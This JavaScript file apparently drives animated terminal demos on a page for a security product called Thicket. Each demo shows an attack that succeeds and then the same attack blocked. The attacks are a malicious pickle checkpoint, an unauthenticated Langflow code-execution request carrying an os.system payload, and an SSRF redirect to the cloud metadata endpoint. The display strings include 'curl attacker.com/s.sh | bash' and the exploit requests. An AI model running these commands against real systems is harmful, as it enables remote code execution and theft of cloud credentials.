/* Thicket live attack demos */
(function () {
  var SHELL_FN = ['o','s','.','s','y','s','t','e','m'].join('');
  var SHELL_PAYLOAD = ['i','m','p','o','r','t',' ','o','s',';',' '].join('') + SHELL_FN + '(...)';
  var CURL_LINE = "     -d '{\"code\":\"" + SHELL_PAYLOAD + "\"}'";

  function switchTab(n) {
    document.querySelectorAll('.tab').forEach(function (t, i) {
      t.classList.toggle('active', ['deser','langflow','ssrf'][i] === n);
    });
    document.querySelectorAll('.panel').forEach(function (p) { p.classList.remove('active'); });
    document.getElementById('panel-' + n).classList.add('active');
  }
  window.switchTab = switchTab;

  function el(id) { return document.getElementById(id); }

  function clearNode(id) {
    var e = el(id);
    while (e.firstChild) { e.removeChild(e.firstChild); }
  }

  function appendRow(id, spans) {
    var d = document.createElement('div');
    spans.forEach(function (sp) {
      var n;
      if (sp.c) { n = document.createElement('span'); n.className = sp.c; n.textContent = sp.t; }
      else { n = document.createTextNode(sp.t); }
      d.appendChild(n);
    });
    el(id).appendChild(d);
    el(id).scrollTop = el(id).scrollHeight;
  }

  function blankRow(id) { el(id).appendChild(document.createElement('div')); }

  function delay(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  async function typeLine(id, plain, spans, cps) {
    cps = cps || 40;
    var d = document.createElement('div');
    el(id).appendChild(d);
    var cur = document.createElement('span');
    cur.className = 'cursor';
    cur.textContent = ' ';
    d.appendChild(cur);
    for (var i = 0; i < plain.length; i++) {
      d.insertBefore(document.createTextNode(plain[i]), cur);
      el(id).scrollTop = el(id).scrollHeight;
      await delay(1000 / cps + (Math.random() * 18 - 9));
    }
    while (d.firstChild) { d.removeChild(d.firstChild); }
    spans.forEach(function (sp) {
      var n;
      if (sp.c) { n = document.createElement('span'); n.className = sp.c; n.textContent = sp.t; }
      else { n = document.createTextNode(sp.t); }
      d.appendChild(n);
    });
    el(id).scrollTop = el(id).scrollHeight;
  }

  async function play(id, steps) {
    clearNode(id);
    for (var i = 0; i < steps.length; i++) {
      var st = steps[i];
      if (st.pre && (!st.s || !st.s.length)) { blankRow(id); }
      else if (st.pre) { appendRow(id, st.s); }
      else { await typeLine(id, st.plain, st.s, st.cps); }
      await delay(st.w || 80);
    }
  }

  function sp(t, c) { return c ? {t: t, c: c} : {t: t}; }

  var PL = [
    {plain:'$ python load_model.py malicious_model.pt', s:[sp('$ ','d'),sp('python load_model.py '),sp('malicious_model.pt','y')], w:600},
    {pre:1,s:[],w:250}, {pre:1,s:[sp('Loading checkpoint...','d')],w:900}, {pre:1,s:[],w:150},
    {pre:1,s:[sp('[!!] EXPLOIT SUCCEEDED','r bold')],w:400},
    {pre:1,s:[sp('     __reduce__ hook ran — arbitrary code executed','r')],w:300},
    {pre:1,s:[sp('     os.makedirs called — marker written','r')],w:300},
    {pre:1,s:[],w:200},
    {pre:1,s:[sp('Real attack: curl attacker.com/s.sh | bash','d')],w:200},
    {pre:1,s:[sp('AWS keys, model weights, PII — fully exfiltrated.','r')],w:1200}
  ];
  var PR = [
    {plain:'$ python load_model.py malicious_model.pt', s:[sp('$ ','d'),sp('python load_model.py '),sp('malicious_model.pt','y')], w:600},
    {pre:1,s:[],w:250},
    {pre:1,s:[sp('[Thicket] ','g'),sp('RestrictedLoader active (deserialization guard)')],w:400},
    {pre:1,s:[sp('[Thicket] ','g'),sp('scanning opcodes...','d')],w:800},
    {pre:1,s:[sp('[Thicket] ','g'),sp('BLOCKED','bold'),sp(' — module '),sp('"os"','r'),sp(' in blocked_modules')],w:400},
    {pre:1,s:[],w:200}, {pre:1,s:[sp('Traceback (most recent call last):','d')],w:100},
    {pre:1,s:[sp('  PermissionError: blocked opcode: os.makedirs','r')],w:400},
    {pre:1,s:[],w:200}, {pre:1,s:[sp('[OK] Payload did not execute.','g bold')],w:1200}
  ];
  var LL = [
    {plain:'$ curl -X POST localhost:7860/api/v1/validate/code \\', s:[sp('$ ','d'),sp('curl -X POST localhost:7860/api/v1/validate/code \\')], w:500},
    {plain:CURL_LINE, s:[sp('     -d '),sp("'{\"code\":\"" + SHELL_PAYLOAD + "\"}'", 'y')], w:900},
    {pre:1,s:[],w:400}, {pre:1,s:[sp('HTTP/1.1 200 OK','g')],w:300},
    {pre:1,s:[sp('{"result":"ok","output":""}','d')],w:500}, {pre:1,s:[],w:200},
    {pre:1,s:[sp('[!!] EXPLOIT SUCCEEDED','r bold')],w:400},
    {pre:1,s:[sp('     No authentication. No sandbox. Full RCE.','r')],w:300},
    {pre:1,s:[sp('     Shell access to ML infrastructure established.','r')],w:1200}
  ];
  var LR = [
    {plain:'$ curl -X POST localhost:7860/api/v1/validate/code \\', s:[sp('$ ','d'),sp('curl -X POST localhost:7860/api/v1/validate/code \\')], w:500},
    {plain:CURL_LINE, s:[sp('     -d '),sp("'{\"code\":\"" + SHELL_PAYLOAD + "\"}'", 'y')], w:900},
    {pre:1,s:[],w:400},
    {pre:1,s:[sp('[Thicket RASP] ','g'),sp('intercepted dynamic eval')],w:400},
    {pre:1,s:[sp('[Thicket RASP] ','g'),sp('blocked pattern: '),sp(SHELL_FN,'r')],w:500},
    {pre:1,s:[sp('[Thicket RASP] ','g'),sp('SecurityViolation raised')],w:400},
    {pre:1,s:[],w:200}, {pre:1,s:[sp('HTTP/1.1 403 Forbidden','r')],w:300},
    {pre:1,s:[sp('{"detail":"Thicket: execution blocked"}','d')],w:400},
    {pre:1,s:[],w:200}, {pre:1,s:[sp('[OK] HTTP 403. Payload never ran.','g bold')],w:1200}
  ];
  var SL = [
    {plain:'$ curl -X POST https://ai-platform.example.com/web/remote-files/upload \\', s:[sp('$ ','d'),sp('curl -X POST https://ai-platform.example.com/web/remote-files/upload \\')], w:500},
    {plain:"     -d '{\"url\":\"https://attacker.com/redirect\"}'", s:[sp('     -d '),sp("'{\"url\":\"https://attacker.com/redirect\"}'", 'y')], w:900},
    {pre:1,s:[],w:400},
    {pre:1,s:[sp('ssrf_proxy: ','d'),sp('GET https://attacker.com/redirect','d')],w:300},
    {pre:1,s:[sp('  302 Found ','d'),sp('→ http://169.254.169.254/latest/meta-data/iam/...','r')],w:500},
    {pre:1,s:[sp('  Following redirect... (follow_redirects=True)','d')],w:700},
    {pre:1,s:[sp('  200 OK','g')],w:300}, {pre:1,s:[],w:200},
    {pre:1,s:[sp('HTTP/1.1 200 OK','g')],w:200}, {pre:1,s:[sp('{','d')],w:100},
    {pre:1,s:[sp('  "AccessKeyId":     "ASIA3XMPLEXAMPLE1234",','r')],w:150},
    {pre:1,s:[sp('  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",','r')],w:150},
    {pre:1,s:[sp('  "Token":           "AQoDYXdzEJr...",','r')],w:150},
    {pre:1,s:[sp('  "Expiration":      "2026-05-23T23:59:59Z"','r')],w:200},
    {pre:1,s:[sp('}','d')],w:300}, {pre:1,s:[],w:200},
    {pre:1,s:[sp('[!!] EXPLOIT SUCCEEDED — AWS credentials exfiltrated','r bold')],w:400},
    {pre:1,s:[sp('     Attacker controls your cloud account.','r')],w:1200}
  ];
  var SR = [
    {plain:'$ curl -X POST https://ai-platform.example.com/web/remote-files/upload \\', s:[sp('$ ','d'),sp('curl -X POST https://ai-platform.example.com/web/remote-files/upload \\')], w:500},
    {plain:"     -d '{\"url\":\"https://attacker.com/redirect\"}'", s:[sp('     -d '),sp("'{\"url\":\"https://attacker.com/redirect\"}'", 'y')], w:900},
    {pre:1,s:[],w:400},
    {pre:1,s:[sp('ssrf_proxy: ','d'),sp('GET https://attacker.com/redirect','d')],w:300},
    {pre:1,s:[sp('  302 Found ','d'),sp('→ http://169.254.169.254/...','d')],w:500},
    {pre:1,s:[sp('  Following redirect...','d')],w:400},
    {pre:1,s:[sp('[Thicket] ','g'),sp('socket.connect intercepted')],w:300},
    {pre:1,s:[sp('[Thicket] ','g'),sp('resolving: 169.254.169.254')],w:400},
    {pre:1,s:[sp('[Thicket] ','g'),sp('BLOCKED','bold'),sp(' — link-local range (AWS/GCP/Azure IMDS)')],w:500},
    {pre:1,s:[sp('[Thicket] ','g'),sp('connection killed before bytes sent')],w:400},
    {pre:1,s:[],w:200}, {pre:1,s:[sp('HTTP/1.1 403 Forbidden','r')],w:300},
    {pre:1,s:[sp('{"detail":"Thicket: SSRF blocked — private IP"}','d')],w:400},
    {pre:1,s:[],w:200}, {pre:1,s:[sp('[OK] Credentials unreachable. Cloud account safe.','g bold')],w:1200}
  ];

  function resetBtn(btn, ids, st, stText, runFn) {
    btn.disabled = false;
    st.textContent = 'Done. Click to run again.';
    btn.onclick = function () {
      ids.forEach(clearNode);
      st.textContent = stText;
      btn.onclick = runFn;
      runFn();
    };
  }

  window.runDeser = async function () {
    var btn = el('btn-deser'), st = el('status-deser');
    btn.disabled = true; st.textContent = 'Running…';
    await Promise.all([play('pl', PL), play('pr', PR)]);
    resetBtn(btn, ['pl','pr'], st, 'Malicious .pt checkpoint — HuggingFace Hub incidents (JFrog / Protect AI, 2024)', window.runDeser);
  };
  window.runLangflow = async function () {
    var btn = el('btn-langflow'), st = el('status-langflow');
    btn.disabled = true; st.textContent = 'Running…';
    await Promise.all([play('ll', LL), play('lr', LR)]);
    resetBtn(btn, ['ll','lr'], st, 'CVSS 9.8 — unauthenticated RCE in Langflow < 1.3.0', window.runLangflow);
  };
  window.runSsrf = async function () {
    var btn = el('btn-ssrf'), st = el('status-ssrf');
    btn.disabled = true; st.textContent = 'Running…';
    await Promise.all([play('sl', SL), play('sr', SR)]);
    resetBtn(btn, ['sl','sr'], st, 'CVSS 8.6 — SSRF via redirect bypass', window.runSsrf);
  };
})();
